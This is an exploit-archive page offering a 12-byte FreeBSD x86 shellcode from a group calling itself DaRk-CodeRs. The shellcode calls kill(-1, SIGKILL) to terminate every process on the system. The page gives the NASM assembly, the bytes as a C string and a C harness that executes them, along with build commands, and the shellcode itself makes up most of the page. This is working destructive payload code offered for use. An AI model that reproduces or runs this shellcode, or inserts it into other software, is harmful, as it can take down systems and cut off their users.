<html><head><title>FreeBSD/x86 - kill all processes - 12 bytes</title>
<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1" />
<meta http-equiv="Content-Language" content="en" />
</head>


<pre>
            ***(C)oDed bY suN8Hclf***
       DaRk-CodeRs Group productions, kid
 [FreeBSD x86 kill all procesess 12 bytes shellcode]


Compile:
nasm -f elf code.asm
ld -e _start -o code code.o

Assembly code:
---------------------code.asm-------------------
section .text
global _start

_start:
xor eax, eax
push byte 9 ; SIGKILL
dec eax
push eax    ; -1 (0xffffffff)
inc eax
mov al, 37  ;kill() syscall number, check /usr/src/sys/kern/syscalls.master for details
push eax
int 0x80
---------------------code.asm-------------------

And C code:
---------------------code.c---------------------
#include &quot;stdio.h&quot;

char shellcode[]=
&quot;\x31\xc0\x6a\x09\x48\x50\x40\xb0\x25\x50\xcd\x80&quot;;

int main()
{
int (*func)();
func=(int (*)())shellcode;
(int)(*func)();
}
---------------------code.c---------------------


Greetz: all DaRk-CodeRs guys, e.wiZz!, doctor
Visit : www.dark-coders.pl


<body><script type="text/javascript">
var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
document.write(unescape("%3Cscript src=%27" + gaJsHost + "google-analytics.com/ga.js%27 type=%27text/javascript%27%3E%3C/script%3E"));
</script>

<script type="text/javascript">
try {
var pageTracker = _gat._getTracker("UA-6809519-1");
pageTracker._trackPageview();
} catch(err) {}</script></body></html>
